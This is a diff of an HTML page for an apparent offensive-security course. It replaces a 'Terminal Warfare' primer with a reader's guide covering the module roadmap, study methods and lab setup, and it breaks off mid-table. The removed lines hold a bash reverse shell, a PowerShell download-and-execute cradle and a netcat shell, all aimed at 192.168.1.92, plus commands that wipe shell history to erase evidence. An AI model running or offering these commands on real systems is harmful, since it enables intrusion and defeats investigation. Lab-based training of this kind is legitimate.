@@ -3,393 +3,1425 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Module 00 — Terminal Warfare</title>
+<title>Module 00 — Reader & Course Guide — 22nd Survey Division</title>
 <style>
   :root {
-    --bg: #0c0c0c;
-    --fg: #cccccc;
-    --green: #0f0;
-    --red: #f44;
-    --yellow: #ff0;
-    --cyan: #0ff;
-    --magenta: #f0f;
-    --prompt: #0f0;
+    --bg: #0a0a0f;
+    --fg: #e0e0e0;
+    --accent: #ff3333;
+    --accent2: #00ff88;
+    --dim: #666;
+    --border: #333;
+    --neon: #00ffff;
+    --purple: #ff00ff;
+    --amber: #ffaa00;
   }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: var(--bg);
     color: var(--fg);
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    font-size: 15px;
-    line-height: 1.7;
-    padding: 20px;
-    min-height: 100vh;
+    font-family: 'Segoe UI', Consolas, monospace;
+    line-height: 1.6;
   }
-  .container {
-    max-width: 1000px;
-    margin: 0 auto;
-  }
-  .header {
-    text-align: center;
-    margin-bottom: 40px;
-    padding-bottom: 30px;
-    border-bottom: 2px solid #333;
-  }
-  .header h1 {
-    color: var(--green);
-    font-size: 32px;
-    text-transform: uppercase;
-    letter-spacing: 4px;
-    margin-bottom: 10px;
-  }
-  .header .subtitle {
-    color: #666;
-    font-size: 16px;
-  }
-  .section {
-    margin-bottom: 40px;
-    padding: 25px;
-    background: #111;
-    border: 1px solid #222;
-    border-radius: 8px;
-  }
-  .section-title {
-    color: var(--yellow);
-    font-size: 20px;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    margin-bottom: 20px;
-    padding-left: 15px;
-    border-left: 4px solid var(--yellow);
-  }
-  .section-content {
-    color: #bbb;
-  }
-  .section-content p {
-    margin-bottom: 15px;
-  }
+  .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+  h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
+  h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+  h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
   .code-block {
-    background: #0a0a0a;
-    border: 1px solid #333;
-    border-radius: 6px;
-    padding: 15px;
-    margin: 15px 0;
-    font-family: 'Consolas', 'Courier New', monospace;
-    font-size: 13px;
+    background: #1a1a2e;
+    border-left: 4px solid var(--accent);
+    padding: 1rem;
+    margin: 1rem 0;
+    border-radius: 0 8px 8px 0;
     overflow-x: auto;
+    font-family: Consolas, monospace;
+    font-size: 13px;
+    position: relative;
   }
-  .code-block .prompt {
-    color: var(--prompt);
+  .copy-btn {
+    position: absolute;
+    top: 0.5rem;
+    right: 0.5rem;
+    background: var(--accent);
+    color: var(--bg);
+    border: none;
+    padding: 0.2rem 0.6rem;
+    border-radius: 4px;
+    font-size: 0.7rem;
+    cursor: pointer;
   }
-  .code-block .command {
+  .copy-btn:hover { background: #ff5555; }
+  .evidence-box {
+    background: #1a0a0a;
+    border: 2px solid var(--accent);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .evidence-box h3 { color: var(--accent); margin-bottom: 0.5rem; }
+  .first-principle {
+    background: #0a1a0a;
+    border: 2px solid var(--accent2);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+  .step-box {
+    background: #0f0f15;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1rem 0;
+  }
+  .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+  .why-box {
+    background: #1a1a0a;
+    border-left: 4px solid #ffaa00;
+    padding: 1rem;
+    margin: 1rem 0;
+  }
+  .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+  .warning-box {
+    background: #2a0a0a;
+    border: 2px solid #ff5555;
+    border-radius: 8px;
+    padding: 1rem;
+    margin: 1rem 0;
+  }
+  .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+  .neon-highlight {
+    color: var(--neon);
+    text-shadow: 0 0 10px var(--neon);
+    font-weight: bold;
+  }
+  .neon-purple {
+    color: var(--purple);
+    text-shadow: 0 0 10px var(--purple);
+    font-weight: bold;
+  }
+  .neon-amber {
+    color: var(--amber);
+    text-shadow: 0 0 10px var(--amber);
+    font-weight: bold;
+  }
+  .cross-link {
+    background: rgba(0, 255, 255, 0.1);
+    border: 1px solid var(--neon);
+    border-radius: 4px;
+    padding: 0.5rem 1rem;
+    margin: 0.5rem 0;
+    display: inline-block;
+    color: var(--neon);
+    text-decoration: none;
+  }
+  .cross-link:hover {
+    background: rgba(0, 255, 255, 0.2);
+  }
+  .method-card {
+    background: #0f0f15;
+    border: 2px solid var(--border);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1rem 0;
+    transition: border-color 0.3s;
+  }
+  .method-card:hover {
+    border-color: var(--accent);
+  }
+  .method-card h4 {
+    color: var(--accent);
+    margin-bottom: 0.5rem;
+    font-size: 1.1rem;
+  }
+  .quiz-container {
+    background: #0f0f15;
+    border: 2px solid var(--purple);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+  }
+  .quiz-option {
+    background: #1a1a2e;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 0.8rem 1rem;
+    margin: 0.5rem 0;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+  .quiz-option:hover {
+    border-color: var(--neon);
+    background: #1a1a3e;
+  }
+  .quiz-option.correct {
+    border-color: var(--accent2);
+    background: #0a2a0a;
+  }
+  .quiz-option.wrong {
+    border-color: var(--accent);
+    background: #2a0a0a;
+  }
+  .quiz-feedback {
+    margin-top: 1rem;
+    padding: 1rem;
+    border-radius: 4px;
+    display: none;
+  }
+  .quiz-feedback.show { display: block; }
+  .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+  .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+  .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+  .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
+  .nav a:hover { background: var(--accent); color: var(--bg); }
+  .progress-bar {
+    width: 100%;
+    height: 4px;
+    background: var(--border);
+    margin: 2rem 0;
+    border-radius: 2px;
+  }
+  .progress-fill {
+    height: 100%;
+    background: var(--accent);
+    width: 0%;
+    transition: width 0.5s;
+    border-radius: 2px;
+  }
+  .status-badge {
+    display: inline-block;
+    padding: 0.2rem 0.6rem;
+    border-radius: 12px;
+    font-size: 0.8rem;
+    font-weight: bold;
+    margin-left: 0.5rem;
+  }
+  .status-live { background: var(--accent2); color: var(--bg); }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1rem 0;
+  }
+  th, td {
+    padding: 0.5rem;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+  }
+  th { color: var(--neon); font-weight: bold; }
+  .schedule-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+  .schedule-card {
+    background: #0f0f15;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+  }
+  .schedule-card h4 { color: var(--accent); margin-bottom: 0.5rem; }
+  .schedule-card .week { color: var(--accent2); font-weight: bold; }
+  .tip-box {
+    background: #0a0a1a;
+    border-left: 4px solid var(--purple);
+    padding: 1rem;
+    margin: 1rem 0;
+  }
+  .tip-box h5 { color: var(--purple); margin-bottom: 0.5rem; }
+  .cheat-sheet-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 1rem;
+    margin: 1.5rem 0;
+  }
+  .cheat-card {
+    background: #0f0f15;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+  }
+  .cheat-card h4 { color: var(--neon); margin-bottom: 0.5rem; font-size: 0.95rem; }
+  .cheat-card code {
+    display: block;
+    background: #1a1a2e;
+    padding: 0.5rem;
+    border-radius: 4px;
+    font-size: 12px;
+    margin: 0.3rem 0;
+    color: var(--accent2);
+  }
+  .lab-diagram {
+    background: #0f0f15;
+    border: 2px solid var(--border);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
+    text-align: center;
+  }
+  .lab-node {
+    display: inline-block;
+    background: #1a1a2e;
+    border: 2px solid var(--accent);
+    border-radius: 8px;
+    padding: 1rem 1.5rem;
+    margin: 0.5rem;
     color: var(--fg);
+    font-weight: bold;
   }
-  .code-block .output {
-    color: #888;
-    margin-top: 8px;
-    padding-left: 20px;
+  .lab-node.target { border-color: var(--accent); }
+  .lab-node.attacker { border-color: var(--accent2); }
+  .lab-node.router { border-color: var(--neon); }
+  .lab-arrow {
+    display: inline-block;
+    color: var(--dim);
+    font-size: 24px;
+    margin: 0 0.5rem;
+    vertical-align: middle;
   }
-  .note {
-    background: #1a1a1a;
-    border-left: 4px solid var(--magenta);
-    padding: 15px;
-    margin: 20px 0;
-    color: var(--magenta);
+  .mentor-quote {
+    background: #1a1a0a;
+    border: 2px dashed var(--amber);
+    border-radius: 8px;
+    padding: 1.5rem;
+    margin: 1.5rem 0;
     font-style: italic;
   }
-  .warning {
-    background: #1a1a1a;
-    border-left: 4px solid var(--red);
-    padding: 15px;
-    margin: 20px 0;
-    color: var(--red);
-  }
-  .widget-container {
-    margin: 40px 0;
-    border: 2px solid #333;
-    border-radius: 8px;
-    overflow: hidden;
-  }
-  .widget-header {
-    background: #1a1a1a;
-    padding: 15px;
-    text-align: center;
-    color: var(--green);
-    font-size: 18px;
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    border-bottom: 1px solid #333;
-  }
-  .widget-iframe {
-    width: 100%;
-    height: 600px;
-    border: none;
-    background: #000;
-  }
-  .nav {
-    display: flex;
-    justify-content: space-between;
-    margin-top: 40px;
-    padding-top: 20px;
-    border-top: 1px solid #333;
-  }
-  .nav a {
-    color: var(--green);
-    text-decoration: none;
-    padding: 10px 20px;
-    border: 1px solid var(--green);
-    border-radius: 4px;
-    transition: all 0.3s;
-  }
-  .nav a:hover {
-    background: var(--green);
-    color: #000;
-  }
-  .quick-ref {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 10px;
-    margin-top: 20px;
-  }
-  .quick-ref-item {
-    background: #1a1a1a;
-    padding: 12px;
-    border-radius: 4px;
-    border-left: 3px solid var(--cyan);
-  }
-  .quick-ref-cmd {
-    color: var(--cyan);
-    font-weight: bold;
-    font-family: 'Consolas', monospace;
-  }
-  .quick-ref-desc {
-    color: #888;
-    font-size: 12px;
-    margin-top: 4px;
-  }
+  .mentor-quote p { margin-bottom: 0.5rem; }
+  .mentor-quote .author { color: var(--amber); font-weight: bold; font-style: normal; }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <div class="header">
-    <h1>Module 00 — Terminal Warfare</h1>
-    <div class="subtitle">First Principle: The terminal is your weapon. Every command is a round.</div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Section 1: Shell Basics</div>
-    <div class="section-content">
-      <p>Two shells matter: <strong>bash</strong> (Linux) and <strong>PowerShell</strong> (Windows). Know which to use when.</p>
-      
-      <div class="code-block">
-        <span class="prompt">$</span> <span class="command">bash -i &gt;&amp; /dev/tcp/192.168.1.92/4444 0&gt;&amp;1</span>
-        <div class="output"># Reverse shell one-liner. The classic.</div>
-      </div>
-      
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.92/a.ps1')</span>
-        <div class="output"># PowerShell download cradle. Every Windows box has this.</div>
-      </div>
-      
-      <div class="note">PowerShell is signed by Microsoft. The defender's job is to decide if the SCRIPT is malicious, not if PowerShell itself is. Obfuscation buys time.</div>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Section 2: Navigation</div>
-    <div class="section-content">
-      <p>Know where you are. Know what's around you. Then move.</p>
-      
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">pwd</span>
-        <div class="output">C:\Users\gwu07</div>
-      </div>
-      
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">ls</span>
-        <div class="output">22nd-survey-division  vader-fuzz  modules  MODULE_19_LOTL.md</div>
-      </div>
-      
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">cd 22nd-survey-division\modules</span>
-        <div class="output"># Now you're in the modules directory. Context is everything.</div>
-      </div>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Section 3: Network Recon</div>
-    <div class="section-content">
-      <p>Every open port is a conversation. Map your own surface before you scan others.</p>
-      
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">ipconfig | findstr IPv4</span>
-        <div class="output">192.168.1.92<br>192.168.56.1</div>
-      </div>
-      
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">netstat -an | findstr LISTENING</span>
-        <div class="output">0.0.0.0:1337    LISTENING<br>0.0.0.0:4443    LISTENING<br>0.0.0.0:8080    LISTENING<br>0.0.0.0:9090    LISTENING</div>
-      </div>
-      
-      <div class="warning">4443 = C2 listener. 1337 = PostgreSQL. 8080 = Apache. Know what's running on your own machine.</div>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Section 4: Process Check</div>
-    <div class="section-content">
-      <p>See what's running. See what's hiding. Kill what needs killing.</p>
-      
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">Get-Process | Sort-Object CPU -Descending | Select-Object -First 5</span>
-        <div class="output">Name      Id    CPU<br>----      --    ---<br>python  31248  245.67<br>avp      4968   89.23<br>postgres 9180   45.12</div>
-      </div>
-      
-      <div class="note">python PID 31248 = C2 listener. avp = Kaspersky watching. Know your own processes.</div>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Section 5: netcat — Swiss Army Knife</div>
-    <div class="section-content">
-      <p>Bind shell. Reverse shell. File transfer. netcat does it all.</p>
-      
-      <div class="code-block">
-        <span class="prompt">$</span> <span class="command">nc -lvnp 4444</span>
-        <div class="output">listening on [any] 4444 ...</div>
-      </div>
-      
-      <div class="code-block">
-        <span class="prompt">$</span> <span class="command">nc 192.168.1.92 4444 -e /bin/bash</span>
-        <div class="output"># Target connects back. Shell established.</div>
-      </div>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Section 6: ssh Tunneling</div>
-    <div class="section-content">
-      <p>SSH is a tunnel, not just a shell. Route traffic through jumpboxes.</p>
-      
-      <div class="code-block">
-        <span class="prompt">$</span> <span class="command">ssh -L 8080:internal.target.com:80 user@jumpbox</span>
-        <div class="output"># Browse localhost:8080 → reaches internal.target.com:80</div>
-      </div>
-      
-      <div class="code-block">
-        <span class="prompt">$</span> <span class="command">ssh -D 1080 user@jumpbox</span>
-        <div class="output"># SOCKS5 proxy on localhost:1080. Route anything through it.</div>
-      </div>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Section 7: History Poisoning</div>
-    <div class="section-content">
-      <p>Every command is evidence. Leave nothing or leave lies.</p>
-      
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">Set-PSReadlineOption -HistorySaveStyle SaveNothing</span>
-        <div class="output"># PowerShell history disabled. No transcript written.</div>
-      </div>
-      
-      <div class="code-block">
-        <span class="prompt">$</span> <span class="command">unset HISTFILE; HISTFILE=/dev/null; history -c</span>
-        <div class="output"># bash history cleared. No .bash_history evidence.</div>
-      </div>
-      
-      <div class="warning">The defender reads .bash_history and PowerShell transcripts. You leave nothing or you leave lies.</div>
-    </div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Quick Reference Card</div>
-    <div class="quick-ref">
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">pwd</div>
-        <div class="quick-ref-desc">Where am I</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">ls / dir</div>
-        <div class="quick-ref-desc">What's here</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">cd</div>
-        <div class="quick-ref-desc">Move around</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">ipconfig</div>
-        <div class="quick-ref-desc">Network config</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">netstat -an</div>
-        <div class="quick-ref-desc">Show ports</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">whoami /priv</div>
-        <div class="quick-ref-desc">Who am I</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">Get-Process</div>
-        <div class="quick-ref-desc">Show processes</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">nc</div>
-        <div class="quick-ref-desc">Swiss Army knife</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">ssh -L</div>
-        <div class="quick-ref-desc">Port forward</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">history -c</div>
-        <div class="quick-ref-desc">Clear evidence</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">&gt; / &gt;&gt; / |</div>
-        <div class="quick-ref-desc">Redirect / pipe</div>
-      </div>
-      <div class="quick-ref-item">
-        <div class="quick-ref-cmd">tmux</div>
-        <div class="quick-ref-desc">Persistent sessions</div>
-      </div>
-    </div>
-  </div>
-
-  <div class="widget-container">
-    <div class="widget-header">Interactive Terminal Demo</div>
-    <iframe class="widget-iframe" src="../widgets/terminal_101_widget.html" title="Terminal 101 Interactive Demo"></iframe>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Lab: Terminal Survival</div>
-    <div class="section-content">
-      <p>Run these commands. All must work before you advance.</p>
-      
-      <div class="code-block">
-        1.  Open PowerShell as admin<br>
-        2.  cd C:\Users\Public<br>
-        3.  mkdir 22SD-test<br>
-        4.  echo "test" &gt; file.txt<br>
-        5.  cat file.txt<br>
-        6.  ipconfig | findstr IPv4<br>
-        7.  netstat -an | findstr :443<br>
-        8.  whoami /priv<br>
-        9.  Start-Process notepad -WindowStyle Hidden<br>
-        10. Get-Process notepad | Stop-Process
-      </div>
-      
-      <div class="note">All commands worked? You can survive the terminal. Move to Module 01.</div>
-    </div>
-  </div>
-
   <div class="nav">
-    <a href="index.html">← Back to Course</a>
+    <a href="../index.html">← Home</a>
+    <a href="MODULE_01.html">Module 01 →</a>
+  </div>
+
+  <h1>Module 00: Reader & Course Guide <span class="status-badge status-live">START HERE</span></h1>
+  
+  <div class="progress-bar"><div class="progress-fill"></div></div>
+  <p style="color: var(--dim); font-size: 0.9rem;">Module 00 of 22 — How to use this course, build your lab, and survive the training</p>
+
+  <div class="first-principle">
+    <h3>🧠 The Core Truth</h3>
+    <p>This course is not a reading list. It is a <span class="neon-highlight">weapons manual</span>. Every module is designed to be executed, not memorized. You will build tools, break systems, and learn to think like both attacker and defender. <span class="neon-amber">The terminal is your weapon. Every command is a round.</span></p>
+    <p style="margin-top: 1rem;"><strong>Before you touch Module 01:</strong> Read this guide. Build your lab. Set your schedule. Understand the methodology. Skipping this module is like skipping weapons safety — you will hurt yourself.</p>
+  </div>
+
+  <!-- SECTION 1: HOW TO USE THIS COURSE -->
+  <h2>📖 Section 1: How to Use This Course</h2>
+
+  <div class="method-card">
+    <h4>The 22-Module Architecture</h4>
+    <p>This course is organized into 22 modules, each building on the last. You do not skip modules. You do not speed-run. You <span class="neon-highlight">execute every lab</span> before advancing.</p>
+    <table>
+      <tr>
+        <th>Phase</th>
+        <th>Modules</th>
+        <th>Focus</th>
+      </tr>
+      <tr>
+        <td>Foundation</td>
+        <td>00 — 04</td>
+        <td>Shell, networking, PowerShell, reconnaissance</td>
+      </tr>
+      <tr>
+        <td>Execution</td>
+        <td>05 — 09</td>
+        <td>Exploitation, memory, privilege escalation, malware</td>
+      </tr>
+      <tr>
+        <td>Persistence</td>
+        <td>10 — 14</td>
+        <td>Code injection, rootkits, EDR evasion, cloud files</td>
+      </tr>
+      <tr>
+        <td>Operations</td>
+        <td>15 — 19</td>
+        <td>Lateral movement, C2, Active Directory, LOTL</td>
+      </tr>
+      <tr>
+        <td>Mastery</td>
+        <td>20 — 22</td>
+        <td>Advanced topics, capstone, final exam</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="step-box">
+    <h4>The Execution Rule</h4>
+    <p>Every module contains:</p>
+    <ul style="margin-left: 1.5rem; line-height: 2;">
+      <li><strong>Theory:</strong> Why the technique works. Read once.</li>
+      <li><strong>Code:</strong> Working examples. Copy, build, run.</li>
+      <li><strong>Lab:</strong> Hands-on exercises. Do not skip.</li>
+      <li><strong>Quiz:</strong> Knowledge check. Pass before advancing.</li>
+      <li><strong>Cross-links:</strong> Connections to other modules. Follow them.</li>
+    </ul>
+    <div class="warning-box">
+      <h5>⚠️ The Golden Rule</h5>
+      <p>If you cannot explain a technique to a teammate in 60 seconds, you do not understand it. Go back. Do the lab again. Build it from scratch without looking at the code.</p>
+    </div>
+  </div>
+
+  <div class="why-box">
+    <h5>Why Cross-Links Matter</h5>
+    <p>Offensive security is not a list of tricks. It is a <span class="neon-highlight">web of interconnected techniques</span>. Code injection (Module 10) requires privilege escalation (Module 08). Privilege escalation requires reconnaissance (Module 02). Reconnaissance requires networking (Module 01). The cross-links show you how techniques chain together in real operations.</p>
+  </div>
+
+  <!-- SECTION 2: STUDY METHODOLOGY -->
+  <h2>🧠 Section 2: Study Methodology</h2>
+
+  <div class="method-card">
+    <h4>The Feynman Technique for Operators</h4>
+    <p>Richard Feynman said: "If you can't explain it simply, you don't understand it well enough." For offensive security, we adapt this:</p>
+    <ol style="margin-left: 1.5rem; line-height: 2;">
+      <li><strong>Study:</strong> Read the module. Watch the technique work.</li>
+      <li><strong>Build:</strong> Reconstruct the technique from memory. Fail. Re-read. Build again.</li>
+      <li><strong>Teach:</strong> Explain it to yourself out loud. Record it. Play it back.</li>
+      <li><strong>Simplify:</strong> Reduce the technique to 3 sentences a non-technical person understands.</li>
+      <li><strong>Execute:</strong> Run it in the lab. Document what worked and what failed.</li>
+    </ol>
+  </div>
+
+  <div class="step-box">
+    <h4>The Three-Pass Method</h4>
+    <p>Every module gets three passes:</p>
+    <ul style="margin-left: 1.5rem; line-height: 2;">
+      <li><strong>Pass 1 — The Survey (15 min):</strong> Skim the module. Read headers. Look at code blocks. Note what you don't understand.</li>
+      <li><strong>Pass 2 — The Deep Dive (2-4 hours):</strong> Read every word. Build every example. Run every command. Take notes.</li>
+      <li><strong>Pass 3 — The Synthesis (1 hour):</strong> Close the module. Rebuild the key technique from scratch. Write a one-page summary.</li>
+    </ul>
+  </div>
+
+  <div class="tip-box">
+    <h5>💡 Pro Tip: The 80/20 Rule</h5>
+    <p>80% of your operational success will come from 20% of these techniques. Identify your 20% early. For most operators, that is: <span class="neon-highlight">PowerShell</span> (Module 03), <span class="neon-highlight">Privilege Escalation</span> (Module 08), and <span class="neon-highlight">Lateral Movement</span> (Module 15). Master these first.</p>
+  </div>
+
+  <!-- SECTION 3: NOTE-TAKING -->
+  <h2>📝 Section 3: Note-Taking System</h2>
+
+  <div class="method-card">
+    <h4>The Operator's Notebook</h4>
+    <p>Your notes are your second brain. They must be searchable, structured, and actionable. Use this format:</p>
+    <div class="code-block">
+=== NOTE TEMPLATE ===
+
+TECHNIQUE: [Name]
+MODULE: [Number]
+DATE: [YYYY-MM-DD]
+
+WHAT:
+  - One-sentence description of the technique
+
+WHY:
+  - When to use it (what problem it solves)
+  - When NOT to use it (detection risks, prerequisites)
+
+HOW:
+  - Step-by-step commands (copy-paste ready)
+  - Required tools
+  - Required privileges
+
+EVIDENCE:
+  - What the defender sees
+  - How to clean up
+  - How to verify success
+
+CROSS-LINKS:
+  - Related modules
+  - Related techniques
+  - Common chains (e.g., Recon → PrivEsc → Injection)
+
+LAB NOTES:
+  - What worked
+  - What failed
+  - Modifications made
+  - Target environment
+    </div>
+  </div>
+
+  <div class="step-box">
+    <h4>Digital vs. Physical Notes</h4>
+    <p><strong>Digital (Recommended):</strong> Use Obsidian, Notion, or markdown files in a private Git repo. Tag everything. Search everything. Cross-link everything.</p>
+    <p><strong>Physical:</strong> Keep a waterproof notebook for quick sketches, network diagrams, and offline reference. Never write passwords in it. Use code names for targets.</p>
+    <div class="warning-box">
+      <h5>⚠️ OPSEC Warning</h5>
+      <p>Your notes are evidence. Encrypt digital notes. Store physical notes in a locked container. Assume compromise and write accordingly — no real target names, no real IP addresses, no personal identifiers.</p>
+    </div>
+  </div>
+
+  <div class="tip-box">
+    <h5>💡 The Cheat Sheet Rule</h5>
+    <p>Every module must produce a one-page cheat sheet. If it doesn't fit on one page, you don't understand it well enough. These cheat sheets are your operational reference under pressure.</p>
+  </div>
+
+  <!-- SECTION 4: BUILDING A LAB ENVIRONMENT -->
+  <h2>🖥️ Section 4: Building a Lab Environment</h2>
+
+  <div class="first-principle">
+    <h3>🧠 The Core Truth</h3>
+    <p>You cannot learn offensive security in theory. You need a lab. A lab is a <span class="neon-highlight">controlled battlefield</span> where you can attack, fail, analyze, and attack again without legal consequences. Build it before you touch Module 01.</p>
+  </div>
+
+  <div class="method-card">
+    <h4>Lab Architecture Overview</h4>
+    <div class="lab-diagram">
+      <div class="lab-node attacker">ATTACKER<br><small>Kali Linux<br>192.168.56.10</small></div>
+      <div class="lab-arrow">⇄</div>
+      <div class="lab-node router">NAT / HOST-ONLY<br><small>VirtualBox / VMware</small></div>
+      <div class="lab-arrow">⇄</div>
+      <div class="lab-node target">TARGETS<br><small>Windows 10/11<br>192.168.56.11-20</small></div>
+      <p style="margin-top: 1rem; color: var(--dim);">All traffic stays inside your machine. No external network required.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <h4>Step 1: Choose Your Hypervisor</h4>
+    <table>
+      <tr>
+        <th>Hypervisor</th>
+        <th>Pros</th>
+        <th>Cons</th>
+        <th>Best For</th>
+      </tr>
+      <tr>
+        <td>VirtualBox</td>
+        <td>Free, open-source, snapshots</td>
+        <td>Slower, USB passthrough issues</td>
+        <td>Budget labs, beginners</td>
+      </tr>
+      <tr>
+        <td>VMware Workstation</td>
+        <td>Fast, stable, great networking</td>
+        <td>Paid (Player is free but limited)</td>
+        <td>Professional labs, heavy use</td>
+      </tr>
+      <tr>
+        <td>Hyper-V</td>
+        <td>Built into Windows Pro/Enterprise</td>
+        <td>Nested virtualization issues</td>
+        <td>Windows-native environments</td>
+      </tr>
+      <tr>
+        <td>Proxmox</td>
+        <td>Free, enterprise-grade, web UI</td>
+        <td>Steep learning curve</td>
+        <td>Server labs, teams</td>
+      </tr>
+    </table>
+    <p style="margin-top: 1rem;"><strong>Recommendation:</strong> Start with <span class="neon-highlight">VirtualBox</span> (free) or <span class="neon-highlight">VMware Workstation Pro</span> (if you have a license). Both support snapshots — essential for reverting after malware infections.</p>
+  </div>
+
+  <div class="step-box">
+    <h4>Step 2: Host Machine Requirements</h4>
+    <table>
+      <tr>
+        <th>Component</th>
+        <th>Minimum</th>
+        <th>Recommended</th>
+      </tr>
+      <tr>
+        <td>CPU</td>
+        <td>4 cores</td>
+        <td>8+ cores (Intel i7/Ryzen 7)</td>
+      </tr>
+      <tr>
+        <td>RAM</td>
+        <td>16 GB</td>
+        <td>32+ GB</td>
+      </tr>
+      <tr>
+        <td>Storage</td>
+        <td>256 GB SSD</td>
+        <td>1 TB NVMe SSD</td>
+      </tr>
+      <tr>
+        <td>Network</td>
+        <td>1 NIC</td>
+        <td>2+ NICs (for bridged labs)</td>
+      </tr>
+    </table>
+    <div class="warning-box">
+      <h5>⚠️ Storage Warning</h5>
+      <p>Each Windows VM requires 40-80 GB. A full lab with 5 Windows targets + Kali = 300+ GB. Use an external NVMe SSD if your internal drive is limited.</p>
+    </div>
+  </div>
+
+  <div class="step-box">
+    <h4>Step 3: Base Images</h4>
+    <p>Download and prepare these base images:</p>
+    <div class="code-block">
+=== REQUIRED BASE IMAGES ===
+
+1. Kali Linux (Attacker)
+   URL: https://www.kali.org/get-kali/#kali-virtual-machines
+   Format: VirtualBox or VMware image (pre-built)
+   Disk: 80 GB
+   RAM: 4 GB
+   Notes: Update with `sudo apt update && sudo apt full-upgrade`
+
+2. Windows 10/11 Enterprise Evaluation (Target)
+   URL: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise
+   Format: ISO
+   Disk: 80 GB
+   RAM: 4 GB
+   Notes: 90-day evaluation, can be rearmed 3 times
+
+3. Windows Server 2019/2022 (Domain Target)
+   URL: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022
+   Format: ISO
+   Disk: 60 GB
+   RAM: 4 GB
+   Notes: Required for Module 19 (Active Directory)
+
+4. Ubuntu Server (Linux Target)
+   URL: https://ubuntu.com/download/server
+   Format: ISO
+   Disk: 40 GB
+   RAM: 2 GB
+   Notes: For Linux exploitation modules
+    </div>
+  </div>
+
+  <div class="step-box">
+    <h4>Step 4: Snapshot Strategy</h4>
+    <p>Snapshots are your time machine. Use them religiously.</p>
+    <table>
+      <tr>
+        <th>Snapshot Name</th>
+        <th>When to Take</th>
+        <th>Purpose</th>
+      </tr>
+      <tr>
+        <td>BASE</td>
+        <td>After OS install, before any changes</td>
+        <td>Clean slate for every lab</td>
+      </tr>
+      <tr>
+        <td>TOOLS</td>
+        <td>After installing common tools</td>
+        <td>Skip tool installation time</td>
+      </tr>
